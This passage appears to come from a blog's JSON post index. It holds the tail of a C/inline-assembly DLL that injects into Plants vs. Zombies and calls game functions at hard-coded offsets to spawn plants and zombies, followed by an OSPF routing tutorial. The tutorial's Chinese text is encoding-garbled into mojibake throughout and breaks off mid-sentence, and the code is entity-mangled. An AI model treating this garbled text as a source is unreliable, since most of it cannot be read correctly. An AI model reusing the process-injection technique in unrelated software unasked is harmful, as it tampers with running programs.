&#x2F;&#x2F;æ¤ç‰©ç±»å‹ mov eax, y &#x2F;&#x2F;y push x &#x2F;&#x2F;x mov ecx, BaseAddr mov ecx, [ecx+0x355E0C] mov ecx, [ecx + 0x868] push ecx call PlantFunc popad } return TRUE;} BOOL GrowZombie(DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { LPVOID PlantZombieFunc &#x3D; BaseAddr + 0x35390; __asm { pushad push x push ZombieType mov eax,y mov ecx,BaseAddr mov ecx,[ecx+0x355E0C] mov ecx,[ecx+0x868] mov ecx,[ecx+0x178] &#x2F;&#x2F;ebp call PlantZombieFunc popad } return TRUE;} BOOL WINAPI DllMain(HMODULE hInstance, DWORD fdwReason, LPVOID lpReserved) { DWORD BaseAddr &#x3D; GetModuleHandle(NULL); DWORD pid &#x3D; GetCurrentProcessId(); HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: MessageBoxW(0, L&quot;ProcessAttachDll!&quot;, L&quot;window2&quot;, 0); GrowPlant(BaseAddr,5,3,23); GrowZombie(BaseAddr, 6, 2, 23); break; &#x2F;* case DLL_THREAD_ATTACH: printf(â€œThreadAttach!\\nâ€); break; case DLL_THREAD_DETACH: if (lpReserved &#x3D;&#x3D; NULL) { FreeLibrary(hInstance); } break;*&#x2F; case DLL_PROCESS_DETACH: MessageBoxW(0, Lâ€ProcessDeTachDll!â€, Lâ€window2â€, 0); break; } return TRUE;}","categories":[],"tags":[]},{"title":"ospf","slug":"ospfè¯¦è§£","date":"2022-11-15T16:01:03.000Z","updated":"2023-12-02T12:27:48.406Z","comments":true,"path":"2022/11/16/ospfè¯¦è§£/","link":"","permalink":"http://example.com/2022/11/16/ospf%E8%AF%A6%E8%A7%A3/","excerpt":"å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆOpen Shortest Path First å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†çš„é“¾è·¯çŠ¶æ€è·¯ç”±åè®®ï¼ˆan open-standard Link State routing protocolï¼‰ã€‚æ‰€æœ‰é“¾è·¯çŠ¶æ€è·¯ç”±åè®®éƒ½æ˜¯å¯¹é“¾è·¯çŠ¶æ€è¿›è¡Œé€šå‘Šã€‚å½“é“¾è·¯çŠ¶æ€è·¯ç”±å™¨å¼€å§‹åœ¨æŸæ¡ç½‘ç»œé“¾è·¯ä¸Šè¿ä½œæ—¶ï¼Œé€»è¾‘ç½‘ç»œçš„ç›¸å…³ä¿¡æ¯å°±è¢«æ·»åŠ åˆ°è·¯ç”±å™¨çš„æœ¬åœ°é“¾è·¯çŠ¶æ€æ•°æ®åº“(Link State Database, LSDB)ä¸­ã€‚è¯¥æœ¬åœ°è·¯ç”±å™¨æ­¤æ—¶åœ¨å…¶è¿ä½œé“¾è·¯ä¸Šï¼Œå‘å‡ºHelloæ•°æ®åŒ…ï¼Œä»¥ç¡®å®šå‡ºæ˜¯å¦æœ‰å…¶å®ƒé“¾è·¯çŠ¶æ€è·¯ç”±å™¨ä¹Ÿåœ¨å…¶å„è‡ªæ¥å£ä¸Šè¿è¡Œç€é“¾è·¯çŠ¶æ€è·¯ç”±åè®®ã€‚OSPFç›´æ¥è¿è¡Œåœ¨ IP åè®®ä¸Šï¼Œä½¿ç”¨ IP ä¸‹ç¼–å·ä¸º89å·çš„åè®®ã€‚ OSPFæ¦‚è¿°åŠåŸºç¡€çŸ¥è¯†OSPF Overview and Fundamentals","text":"å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆOpen Shortest Path First å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†çš„é“¾è·¯çŠ¶æ€è·¯ç”±åè®®ï¼ˆan open-standard Link State routing protocolï¼‰ã€‚æ‰€æœ‰é“¾è·¯çŠ¶æ€è·¯ç”±åè®®éƒ½æ˜¯å¯¹é“¾è·¯çŠ¶æ€è¿›è¡Œé€šå‘Šã€‚å½“é“¾è·¯çŠ¶æ€è·¯ç”±å™¨å¼€å§‹åœ¨æŸæ¡ç½‘ç»œé“¾è·¯ä¸Šè¿ä½œæ—¶ï¼Œé€»è¾‘ç½‘ç»œçš„ç›¸å…³ä¿¡æ¯å°±è¢«æ·»åŠ åˆ°è·¯ç”±å™¨çš„æœ¬åœ°é“¾è·¯çŠ¶æ€æ•°æ®åº“(Link State Database, LSDB)ä¸­ã€‚è¯¥æœ¬åœ°è·¯ç”±å™¨æ­¤æ—¶åœ¨å…¶è¿ä½œé“¾è·¯ä¸Šï¼Œå‘å‡ºHelloæ•°æ®åŒ…ï¼Œä»¥ç¡®å®šå‡ºæ˜¯å¦æœ‰å…¶å®ƒé“¾è·¯çŠ¶æ€è·¯ç”±å™¨ä¹Ÿåœ¨å…¶å„è‡ªæ¥å£ä¸Šè¿è¡Œç€é“¾è·¯çŠ¶æ€è·¯ç”±åè®®ã€‚OSPFç›´æ¥è¿è¡Œåœ¨ IP åè®®ä¸Šï¼Œä½¿ç”¨ IP ä¸‹ç¼–å·ä¸º89å·çš„åè®®ã€‚ OSPFæ¦‚è¿°åŠåŸºç¡€çŸ¥è¯†OSPF Overview and Fundamentals äººä»¬ä¸º OSPF æ’°å†™äº†å¤šä¸ªè¯·æ±‚è¯„è®®ï¼ˆRequests for Comments, RFCs)ã€‚åœ¨æœ¬å°èŠ‚ï¼Œå°†é€šè¿‡ä¸€äº› OSPF æœ‰å…³çš„æœ€å¸¸è§çš„å‡ ä¸ª RFCs ï¼Œæ¥äº†è§£ä¸€ä¸‹ OSPF çš„å†å²ã€‚ OSPF å·¥ä½œç»„æˆç«‹äº1987å¹´ï¼Œè‡ªæˆç«‹ä»¥åï¼Œè¯¥å·¥ä½œç»„å‘å¸ƒäº†ä¸ºæ•°ä¼—å¤šçš„ RFCs ã€‚ä¸‹é¢åˆ—å‡ºäº† OSPF æœ‰å…³çš„ä¸€äº›æœ€å¸¸è§çš„ RFCs ã€‚ RFC 1131 â€“ OSPFè§„æ ¼ï¼ŒOSPF SpecificationRFC 1584 â€“ OSPFçš„å¤šæ’­æ‰©å±•, Multicast Extensions to OSPFRFC 1587 â€“ OSPFçš„ NSSA é€‰é¡¹ï¼Œthe OSPF NSSA OptionRFC 1850 â€“ OSPFç‰ˆæœ¬2çš„ç®¡ç†ä¿¡æ¯åº“ï¼ŒOSPF Version 2 Management Informaiton BaseRFC 2328 â€“ OSPFç‰ˆæœ¬2RFC 2740 â€“ OSPFç‰ˆæœ¬3RFC 1131å¯¹ OSPF çš„ç¬¬ä¸€æ¬¡è¿­ä»£ï¼ˆthe first iteration of OSPFï¼‰è¿›è¡Œäº†è¯´æ˜, è€Œåº”ç”¨åœ¨æ˜ç¡®è¯¥åè®®æ˜¯å¦å·¥ä½œçš„æ—©æœŸæµ‹è¯•ä¸­ã€‚ RFC 1584ä¸º OSPF æä¾›äº†å¯¹ IP å¤šæ’­æµé‡çš„æ”¯æŒæ‰©å±•ã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºå¤šæ’­ OSPF ï¼ˆMulticast OSPF, MOSPFï¼‰ã€‚ä½†è¯¥æ ‡å‡†ä¸å¸¸ç”¨åˆ°ï¼Œè€Œæœ€é‡è¦çš„æ˜¯æ€ç§‘ä¸æ”¯æŒè¯¥æ ‡å‡†ã€‚ RFC 1587 å¯¹ä¸€ç§ OSPF çš„æ¬¡æœ«æ¢¢åŒºåŸŸï¼ˆNot-So-Stubby Area, NSSAï¼‰çš„è¿ä½œæ–¹å¼è¿›è¡Œäº†è¯´æ˜ã€‚ NSSA å…è®¸é€šè¿‡ä¸€å°è‡ªæ²»ç³»ç»Ÿè¾¹ç•Œè·¯ç”±å™¨ï¼ˆan Autonomous System Boundary Router, ASBRï¼‰, é‡‡ç”¨ä¸€æ¡ NSSA çš„å¤–éƒ¨LSA, å®ç°å¤–éƒ¨è·¯ç”±çŸ¥è¯†çš„æ³¨å…¥ï¼ˆthe injection of external routing knowledgeï¼‰ã€‚åœ¨æœ¬æ¨¡å—çš„ç¨åä¼šå¯¹ä¸åŒçš„ NSSAs è¿›è¡Œè¯´æ˜ã€‚ RFC 1850å®ç°äº†ä½¿ç”¨ç®€å•ç½‘ç»œç®¡ç†åè®®ï¼ˆSimple Network Management Protocol, SNMPï¼‰å¯¹ OSPF çš„ç½‘ç»œç®¡ç†ã€‚åœ¨ç½‘ç»œç®¡ç†ç³»ç»Ÿä¸­ï¼Œ SNMP ç”¨äºç›‘æµ‹æ¥å…¥ç½‘ç»œè®¾å¤‡ä¸­éœ€è¦ç•™å¿ƒçš„ä¸€äº›æƒ…å†µã€‚æœ¬æ ‡å‡†çš„åº”ç”¨è¶…å‡ºäº† CCNA è€ƒè¯•è¦æ±‚èŒƒå›´ï¼Œä¸ä¼šåœ¨æœ¬ä¹¦ä¸­è¿›è¡Œè¯´æ˜ã€‚ RFC 2328è¯¦ç»†é™ˆè¿°äº† OSPF ç‰ˆæœ¬2çš„æœ€æ–°æ›´æ–°ï¼Œè€Œ OSPF ç‰ˆæœ¬2æ­£æ˜¯ç°ä»Šåœ¨ç”¨çš„é»˜è®¤ç‰ˆæœ¬ã€‚ OSPF ç‰ˆæœ¬2æœ€åˆæ˜¯åœ¨RFC 1247ä¸­è¿›è¡Œè¯´æ˜çš„ï¼Œè¯¥ RFC è§£å†³äº† OSPF ç‰ˆæœ¬1åˆæ¬¡å‘å¸ƒä¸­å‘ç°çš„ä¸€ç³»åˆ—é—®é¢˜ï¼Œå¹¶å¯¹è¯¥åè®®è¿›è¡Œäº†ä¿®æ­£ï¼Œå®ç°äº†æœªæ¥ä¿®æ”¹ä¸è‡´äº§ç”Ÿå‡ºå‘åå…¼å®¹é—®é¢˜ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œ OSPF ç‰ˆæœ¬2ä¸ç‰ˆæœ¬1æ˜¯ä¸å…¼å®¹çš„ã€‚ æœ€åï¼ŒRFC 2740è¯´æ˜äº†ä¸ºæ”¯æŒ IPv6 è€Œå¯¹ OSPF åšå‡ºçš„ä¿®æ”¹ï¼ˆä¹Ÿå°±æ˜¯ç‰ˆæœ¬3ï¼‰ã€‚åº”å‡å®šæœ¬æ¨¡å—ä¸­æ‰€æœ‰å¯¹ OSPF ä¸€è¯çš„ä½¿ç”¨ï¼Œéƒ½æ˜¯æŒ‡çš„ OSPF ç‰ˆæœ¬2ã€‚ é“¾è·¯çŠ¶æ€åŸºç¡€Link State Fundamentals å½“å¯¹æŸæ¡ç‰¹å®šé“¾è·¯(ä¹Ÿå°±æ˜¯æ¥å£ï¼‰å¼€å¯é“¾è·¯çŠ¶æ€è·¯ç”±åè®®æ—¶ï¼Œä¸é‚£ä¸ªç½‘ç»œæœ‰å…³çš„ä¿¡æ¯å°±è¢«åŠ å…¥åˆ°æœ¬åœ° LSDB ä¸­ã€‚è¯¥æœ¬åœ°è·¯ç”±å™¨æ­¤æ—¶å°±å¾€å…¶è¿ä½œçš„å„é“¾è·¯ä¸Šå‘é€Helloæ•°æ®åŒ…ï¼Œä»¥ç¡®å®šæœ‰å¦å…¶å®ƒé“¾è·¯çŠ¶æ€è·¯ç”±å™¨ä¹Ÿåœ¨æ¥å£ä¸Šè¿è¡Œç€ã€‚Helloæ•°æ®åŒ…ç”¨äºé‚»å±…å‘ç°ï¼Œå¹¶åœ¨é‚»å±…è·¯ç”±å™¨ä¹‹é—´ç»´æŠ¤é‚»æ¥å…³ç³»ã€‚æœ¬æ¨¡å—ç¨åéƒ¨åˆ†ä¼šè¯¦ç»†è¯´æ˜è¿™äº›æ¶ˆæ¯ã€‚ åœ¨æ‰¾åˆ°ä¸€å°é‚»å±…è·¯ç”±å™¨åï¼Œ å‡å®šä¸¤å°è·¯ç”±å™¨åœ¨åŒä¸€å­ç½‘ä¸”ä½äºåŒä¸€åŒºåŸŸï¼ŒåŒæ—¶è¯¸å¦‚è®¤è¯æ–¹æ³•åŠè®¡æ—¶å™¨ç­‰å…¶å®ƒå‚æ•°éƒ½æ˜¯ä¸€è‡´çš„ï¼ˆ identical ï¼‰ï¼Œé‚£ä¹ˆæœ¬åœ°è·¯ç”±å™¨å°±å°è¯•å»ºç«‹ä¸€ä¸ªé‚»æ¥å…³ç³»ï¼ˆ adjacency ï¼‰ã€‚æ­¤é‚»æ¥å…³ç³»ä»¤åˆ°ä¸¤å°è·¯ç”±å™¨å°†æ‘˜è¦çš„ LSDB ä¿¡æ¯é€šå‘Šç»™å¯¹æ–¹ã€‚è¿™ç§ä¿¡æ¯äº¤æ¢ï¼Œäº¤æ¢çš„å¹¶éçœŸå®çš„è¯¦ç»†æ•°æ®åº“ä¿¡æ¯ï¼Œè€Œæ˜¯æ•°æ®çš„æ‘˜è¦ã€‚ å„å°è·¯ç”±å™¨å‚ç…§å…¶æœ¬åœ° LSDB ï¼Œå¯¹æ”¶åˆ°çš„æ‘˜è¦ä¿¡æ¯åšå‡ºè¯„ä¼°ï¼Œä»¥ç¡®ä¿å…¶æœ‰ç€æœ€æ–°ä¿¡æ¯ã€‚å¦‚é‚»æ¥å…³ç³»çš„ä¸€ä¾§è®¤è¯†åˆ°å®ƒéœ€è¦ä¸€ä¸ªæ›´æ–°ï¼Œè·¯ç”±å™¨å°±ä»é‚»æ¥è·¯ç”±å™¨è¯·æ±‚æ–°ä¿¡æ¯ã€‚è€Œæ¥è‡ªé‚»å±…è·¯ç”±å™¨çš„æ›´æ–°å°±åŒ…å«äº† LSDB ä¸­çš„å…·ä½“æ•°æ®ã€‚æ­¤äº¤æ¢è¿‡ç¨‹æŒç»­åˆ°ä¸¤å°è·¯ç”±å™¨éƒ½æ‹¥æœ‰åŒæ ·çš„ LSDB ã€‚ OSPF ç”¨åˆ°ä¸åŒç±»å‹çš„æŠ¥æ–‡ï¼Œä»¥äº¤æ¢æ•°æ®åº“ä¿¡æ¯ï¼Œä»è€Œç¡®ä¿æ‰€æœ‰è·¯ç”±å™¨éƒ½æœ‰ç€ç½‘ç»œçš„ç»Ÿä¸€è§†å›¾ã€‚è¿™äº›ä¸åŒçš„æ•°æ®åŒ…ç±»å‹å°†åœ¨æœ¬æ¨¡å—ç¨åè¿›è¡Œè¯¦ç»†è¯´æ˜ã€‚ ç´§æ¥ç€æ•°æ®åº“çš„äº¤æ¢ï¼Œ SPF ç®—æ³•å°±è¿è¡Œèµ·æ¥ï¼Œåˆ›å»ºå‡ºåˆ°æŸä¸ªåŒºåŸŸæˆ–ç½‘ç»œä¸»å¹²ä¸­æ‰€æœ‰ä¸»æœºçš„æœ€çŸ­è·¯å¾„æ ‘, SPFç®—æ³•å°†æ‰§è¡Œè¿ç®—çš„è·¯ç”±å™¨ï¼Œä½œä¸ºè¯¥æ ‘çš„æ ¹ï¼ˆFollowing the database exchange, the SPF algorithm runs and creates a shortest path tree to all hosts in an area or in the network backbone, with the router that is performing the calculation at the root of that treeï¼‰ã€‚åœ¨ç¬¬ 10 å¤©ä¸­ï¼Œå¯¹ SPF ç®—æ³•è¿›è¡Œäº†ç®€è¦ä»‹ç»ã€‚ OSPFåŸºç¡€OSPF Fundamentals ä¸ EIGRP èƒ½å¤Ÿæ”¯æŒå¤šä¸ªç½‘ç»œå±‚åè®®ä¸åŒï¼Œ OSPF åªèƒ½æ”¯æŒ IP ï¼Œä¹Ÿå°±æ˜¯ IPv4 å’Œ IPv6 ã€‚å’Œ EIGRP ç›¸åŒçš„æ˜¯ï¼Œ OSPF æ”¯æŒ VLSM ã€è®¤è¯åŠåœ¨è¯¸å¦‚ä»¥å¤ªç½‘è¿™æ ·çš„å¤šè·¯è®¿é—®ï¼ˆMulti-Access networksï¼‰ç½‘ç»œä¸Šï¼Œäºå‘é€å’Œæ¥æ”¶æ›´æ–°æ—¶ï¼Œåˆ©ç”¨ IP å¤šæ’­æŠ€æœ¯ï¼ˆIP Multicastï¼‰ã€‚ OSPFæ˜¯ä¸€ç§å±‚æ¬¡åŒ–çš„è·¯ç”±åè®®ï¼Œå°†ç½‘ç»œä»¥é€»è¾‘æ–¹å¼ï¼Œåˆ†ä¸ºç§°ä½œåŒºåŸŸçš„ä¼—å¤šå­åŸŸã€‚è¿™ç§é€»è¾‘åˆ†æ®µæ–¹æ³•ï¼Œç”¨äºé™åˆ¶é“¾è·¯çŠ¶æ€é€šå‘Šåœ¨ OSPF åŸŸä¸­æ‰©æ•£çš„èŒƒå›´ï¼ˆOSPF is a hierarchical routing protocol that logically divides the network into subdomains referred to as areas. This logical segmentation is used to limit the scope of Link State Advertisements(LSAs) flooding throughout the OSPF domainï¼‰ã€‚ LSAs æ˜¯ç”±è¿è¡Œ OSPF çš„è·¯ç”±å™¨å‘å‡ºçš„ç‰¹æ®Šç±»å‹æ•°æ®åŒ…ã€‚åœ¨åŒºåŸŸå†…å’ŒåŒºåŸŸé—´ç”¨åˆ°ä¸åŒç±»å‹çš„ LSAs ã€‚é€šè¿‡é™åˆ¶ä¸€äº›ç±»å‹çš„ LSAs åœ¨åŒºåŸŸé—´ä¼ æ’­ï¼Œ OSPF çš„å±‚æ¬¡åŒ–å®ç°æœ‰æ•ˆåœ°å‡å°‘äº† OSPF ç½‘ç»œä¸­è·¯ç”±åè®®æµé‡çš„æ•°é‡ã€‚ æ³¨æ„ï¼š OSPFçš„è¿™äº› LSAs ä¼šåœ¨ç¬¬ 39 å¤©è¯¦ç»†è¯´æ˜ã€‚ åœ¨å¤šåŒºåŸŸ OSPF ç½‘ç»œä¸­ï¼Œå¿…é¡»æŒ‡å®šä¸€ä¸ªåŒºåŸŸä½œä¸ºéª¨å¹²åŒºåŸŸ, æˆ–è€…å«Area 0ã€‚OSPFéª¨å¹²å°±æ˜¯æ­¤ OSPF ç½‘ç»œçš„é€»è¾‘ä¸­å¿ƒã€‚å…¶å®ƒééª¨å¹²åŒºåŸŸéƒ½å¿…é¡»ç‰©ç†è¿æ¥åˆ°éª¨å¹²ã€‚ä½†å› ä¸ºåœ¨ééª¨å¹²åŒºåŸŸå’Œéª¨å¹²åŒºåŸŸä¹‹é—´æœ‰ç€ä¸€æ¡ç‰©ç†è¿æ¥ï¼Œå¹¶éæ€»æ˜¯å¯èƒ½æˆ–å¯è¡Œçš„ï¼Œæ‰€ä»¥ OSPF æ ‡å‡†å…è®¸ä½¿ç”¨åˆ°éª¨å¹²çš„è™šæ‹Ÿè¿æ¥ã€‚è¿™äº›è™šæ‹Ÿè¿æ¥ä¹Ÿå°±æ˜¯å¸¸è¯´çš„è™šæ‹Ÿé“¾è·¯ï¼Œä½†æ­¤æ¦‚å¿µæ˜¯ä¸åŒ…æ‹¬åœ¨å½“å‰çš„ CCNA å¤§çº²ä¸­çš„ï¼ˆIn a multi-area OSPF network, one area must be designated as the backbone area, or Area 0. The OSPF backbone is the logical centre of the OSPF network. All other non-backbone areas must be connected physically to the backbone. However, because it is not always possible or feasible to have a physical connection between a non-backbone area and the backbone, the OSPF standart allows the use of virtual connections to the backbone. These virtual connections are known as virtual links, but this concept is not included in the current CCNA syllabusï¼‰ã€‚ ä½å¤„å„åŒºåŸŸä¸­çš„è·¯ç”±å™¨ï¼Œéƒ½å­˜å‚¨ç€å…¶æ‰€åœ¨åŒºåŸŸçš„è¯¦ç»†æ‹“æ‰‘ä¿¡æ¯ã€‚è€Œåœ¨å„åŒºåŸŸä¸­ï¼Œä¸€å°æˆ–å¤šå°çš„è·¯ç”±å™¨ï¼Œåˆè¢«ä½œä¸ºåŒºåŸŸè¾¹ç•Œè·¯ç”±å™¨ï¼ˆArea Border Routers, ABRsï¼‰ï¼ŒåŒºåŸŸè¾¹ç•Œè·¯ç”±å™¨é€šè¿‡åœ¨ä¸åŒåŒºåŸŸä¹‹é—´é€šå‘Šæ±‡æ€»è·¯ç”±ä¿¡æ¯ï¼Œè€Œä¿ƒè¿›åŒºåŸŸé—´çš„è·¯ç”±ï¼ˆfacilitate inter-area routing by advertising summarised routing informaiton between the differenct areasï¼‰ã€‚æœ¬åŠŸèƒ½å®ç° OSPF ç½‘ç»œä¸­çš„ä»¥ä¸‹å‡ ä¸ªç›®æ ‡ã€‚ åœ¨ OSPF åŸŸå±‚é¢å‡å° LSAs çš„æ‰©æ•£èŒƒå›´, Reduces the scope of LSAs flooding throughout the OSPF domainåœ¨åŒºåŸŸä¹‹é—´éšè—è¯¦ç»†æ‹“æ‰‘ä¿¡æ¯, Hides detailed topology informaiton between areasOSPFåŸŸä¸­ç«¯åˆ°ç«¯è¿é€šæ€§çš„å®ç°, Allows for end-to-end connectivity within the OSPF domainåœ¨ OSPF åŸŸå†…éƒ¨åˆ›å»ºé€»è¾‘è¾¹ç•Œ, Creates logical boundaries within the OSPF domainæ³¨æ„ï¼š å°½ç®¡ ICND1 å¤§çº²ä»…æ¶‰åŠåˆ°å•åŒºåŸŸ OSPF ï¼ˆsingle-area OSPFï¼‰, ä½†ä¸ºæŠŠå¤§éƒ¨åˆ†ç†è®ºçº³å…¥è®¨è®ºèƒŒæ™¯ï¼Œæœ‰å¿…è¦è¯´ä¸€ä¸‹å¤šåŒºåŸŸ OSPF ï¼ˆmulti-area OSPFï¼‰ã€‚ OSPFéª¨å¹²åŒºåŸŸä» ABRs æ¥æ”¶åˆ°æ±‡æ€»è·¯ç”±ä¿¡æ¯ã€‚è¯¥è·¯ç”±ä¿¡æ¯è¢«æ•£å¸ƒåˆ° OSPF ç½‘ç»œä¸­çš„æ‰€æœ‰å…¶å®ƒééª¨å¹²åŒºåŸŸã€‚åœ¨ç½‘ç»œæ‹“æ‰‘å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå˜åŒ–ä¿¡æ¯å°±è¢«æ•£å¸ƒåˆ°æ•´ä¸ªçš„ OSPF åŸŸï¼Œä»¤åˆ°æ‰€æœ‰åŒºåŸŸä¸­çš„æ‰€æœ‰è·¯ç”±å™¨éƒ½æœ‰ç€ç½‘ç»œçš„ç»Ÿä¸€è§†å›¾ï¼ˆThe OSPF backbone area receives summarised routing informaiton from the ABRs. The routing informaiton is disseminated to all other non-backbone areas within the OSPF network. When a change to the network topology occurs, this informaiton is disseminated throughout the entire OSPF domain, allowing all routers in all areas to have a consistent view of the networkï¼‰ã€‚ä¸‹å›¾12.1æ¼”ç¤ºçš„ç½‘ç»œæ‹“æ‰‘ï¼Œå°±æ˜¯ä¸€ä¸ªå¤šåŒºåŸŸ OSPF éƒ¨ç½²çš„ç¤ºä¾‹ã€‚ ä¸€ä¸ªå¤šåŒºåŸŸ OSPF ç½‘ç»œ å›¾12.1 â€“ ä¸€ä¸ªå¤šåŒºåŸŸ OSPF ç½‘ç»œ å›¾12.1æ¼”ç¤ºäº†ä¸€ä¸ªåŸºæœ¬çš„å¤šåŒºåŸŸ OSPF ç½‘ç»œã€‚1ã€2å·åŒºåŸŸè¿æ¥åˆ°0å·åŒºåŸŸï¼Œä¹Ÿå°±æ˜¯ OSPF éª¨å¹²ä¸Šã€‚1å·åŒºåŸŸä¸­ï¼Œè·¯ç”±å™¨R1ã€R2å’ŒR3äº¤æ¢ç€åŒºåŸŸå†…ï¼ˆintra-areaï¼‰è·¯ç”±ä¿¡æ¯ï¼Œå¹¶ç»´æŠ¤ç€é‚£ä¸ªåŒºåŸŸçš„è¯¦ç»†æ‹“æ‰‘ã€‚R3ä½œä¸º ABR ï¼Œç”Ÿæˆä¸€æ¡åŒºåŸŸé—´æ±‡æ€»è·¯ç”±ï¼ˆan inter-area summary routeï¼‰, å¹¶å°†è¯¥è·¯ç”±é€šå‘Šç»™ OSPF éª¨å¹²ã€‚ R4ï¼Œä¹Ÿå°±æ˜¯2å·åŒºåŸŸçš„ ABR ï¼Œä»0å·åŒºåŸŸæ¥æ”¶åˆ°R3é€šå‘Šå‡ºçš„æ±‡æ€»ä¿¡æ¯ï¼Œå¹¶å°†å…¶æ‰©æ•£åˆ°å…¶é‚»æ¥åŒºåŸŸã€‚è¿™æ ·åšå°±ä»¤åˆ°R5å’ŒR6çŸ¥æ‚‰ä½å¤„å…¶æœ¬åœ°åŒºåŸŸå¤–ã€ä½†ä»åœ¨ OSPF åŸŸå†…çš„é‚£äº›è·¯ç”±äº†ã€‚åŒæ ·æ¦‚å¿µä¹Ÿé€‚ç”¨äº2å·åŒºåŸŸå†…çš„è·¯ç”±ä¿¡æ¯ï¼ˆR4, the ABR for Area 2, receives the summary informaiton from Area 0 and floods it into its adjacent area. This allows routers R5 and R6 to know of the routes that reside outside of their local area but within the OSPF domain. The same concept would also be applicable to the routing informaiton within Area 2ï¼‰ã€‚ æ€»çš„æ¥è®²ï¼Œ ABRs éƒ½ç»´æŠ¤ç€æ‰€æœ‰å…¶å„è‡ªè¿æ¥åŒºåŸŸçš„ LSDB ä¿¡æ¯ã€‚è€Œå„ä¸ªåŒºåŸŸä¸­çš„æ‰€æœ‰è·¯ç”±å™¨ï¼Œéƒ½æœ‰ç€å±äºå…¶ç‰¹å®šåŒºåŸŸçš„è¯¦ç»†æ‹“æ‰‘ä¿¡æ¯ã€‚è¿™äº›è·¯ç”±å™¨äº¤æ¢ç€åŒºåŸŸå†…çš„è·¯ç”±ä¿¡æ¯ã€‚ ABRs åˆ™å°†æ‰€è¿æ¥åŒºåŸŸçš„æ±‡æ€»ä¿¡æ¯é€šå‘Šç»™å…¶å®ƒ OSPF åŒºåŸŸï¼Œä»¥å®ç°åŸŸå†…å„å­åŸŸï¼ˆåŒºåŸŸï¼‰é—´çš„è·¯ç”±ï¼ˆIn summation, the ABRs maintain LSDB informaiton for all the areas in which they are connected. All routers within each area have detailed topology informaiton pertaining to that specific area. These routers exchange intra-area routing informaiton. The ABRs advertise summary informaiton from each of their connected areas to other OSPF areas, allowing inter-area routing within the domainï¼‰ã€‚ æ³¨æ„ï¼š æœ¬ä¹¦åé¢ä¼šè¯¦ç»†è¯´æ˜OSPF ABRsåŠå…¶å®ƒ OSPF è·¯ç”±å™¨ç±»å‹ã€‚ ç»„ç½‘ç±»å‹Network Types å¯¹ä¸åŒä¼ è¾“ä»‹è´¨ï¼Œ OSPF é‡‡ç”¨ä¸åŒé»˜è®¤ç»„ç½‘ç±»å‹ï¼Œæœ‰ä¸‹é¢è¿™äº›: éå¹¿æ’­ç»„ç½‘ï¼ˆåœ¨å¤šç‚¹éå¹¿æ’­å¤šè·¯å¤ç”¨ä¼ è¾“ä»‹è´¨ä¸Šï¼Œä¹Ÿå°±æ˜¯ FR å’ŒATM, é»˜è®¤é‡‡ç”¨æ­¤ç§ç»„ç½‘ç±»å‹ï¼Œ Non-Broadcastï¼Œdefault on Multipoint Non-Broadcast Multi-Access(FR and ATM)ï¼‰ç‚¹å¯¹ç‚¹ç»„ç½‘ï¼ˆåœ¨ HDLC ã€ PPP ã€ FR åŠ ATM çš„ P2P å­æ¥å£ï¼Œä»¥åŠ ISDN ä»‹è´¨ä¸Šï¼Œé»˜è®¤é‡‡ç”¨æ­¤ç§ç»„ç½‘ç±»å‹ï¼Œ Point-to-Pointï¼Œdefault on HDLC, PPP, P2P subinterface on FR and ATM, and ISDNï¼‰å¹¿æ’­ç»„ç½‘ï¼ˆåœ¨ä»¥å¤ªç½‘å’Œä»¤ç‰Œç¯ä»‹è´¨ä¸Šï¼Œé»˜è®¤é‡‡ç”¨æ­¤ç§ç»„ç½‘ç±»å‹ï¼Œ Broadcastï¼Œdefault on Ethernet and Token Ringï¼‰ç‚¹å¯¹å¤šç‚¹ç»„ç½‘ï¼ˆPoint-to-Multipointï¼‰ç¯å›ç»„ç½‘ï¼ˆé»˜è®¤åœ¨ç¯å›æ¥å£ä¸Šé‡‡ç”¨æ­¤ç§ç»„ç½‘ç±»å‹ï¼Œ Loopbackï¼Œdefault on Loopback interfacesï¼‰éå¹¿æ’­ç½‘ç»œæ˜¯æŒ‡é‚£äº›æ²¡æœ‰åŸç”Ÿçš„å¹¿æ’­æˆ–å¤šæ’­æµé‡æ”¯æŒçš„ç½‘ç»œç±»å‹ã€‚éå¹¿æ’­ç±»å‹ç½‘ç»œçš„æœ€å¸¸è§å®ä¾‹å°±æ˜¯å¸§ä¸­ç»§ç½‘ç»œã€‚éå¹¿æ’­ç±»å‹ç½‘ç»œéœ€è¦é¢å¤–é…ç½®ï¼Œä»¥å®ç°å¹¿æ’­å’Œå¤šæ’­æ”¯æŒã€‚åœ¨è¿™ç§ç½‘ç»œä¸Šï¼Œ OSPF é€‰ä¸¾å‡ºä¸€å°æŒ‡å®šè·¯ç”±å™¨(a Designate Router, DR), åŠ&#x2F;æˆ–ä¸€å°å¤‡ç”¨æŒ‡å®šè·¯ç”±å™¨ï¼ˆa Backup Designated Router, BDRï¼‰ã€‚åœ¨æœ¬ä¹¦åé¢ä¼šå¯¹è¿™ä¸¤å°è·¯ç”±å™¨è¿›è¡Œè¯´æ˜ã€‚ æ€ç§‘ IOS è½¯ä»¶ä¸­ï¼Œéå¹¿æ’­ç±»å‹ç½‘ç»œä¸Šå¼€å¯äº† OSPF çš„è·¯ç”±å™¨ï¼Œé»˜è®¤æ¯30ç§’å‘å‡ºHelloæ•°æ®åŒ…ã€‚è‹¥4ä¸ªHelloé—´éš”ï¼Œä¹Ÿå°±æ˜¯120ç§’ä¸­éƒ½æ²¡æœ‰æ”¶åˆ°Helloæ•°æ®åŒ…ï¼Œé‚£ä¹ˆè¯¥é‚»å±…è·¯ç”±å™¨å°±è¢«è®¤ä¸ºæ˜¯â€œæ­»äº†â€ã€‚ä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†åœ¨ä¸€ä¸ªå¸§ä¸­ç»§ä¸²è¡Œæ¥å£ä¸Šshow ip ospf 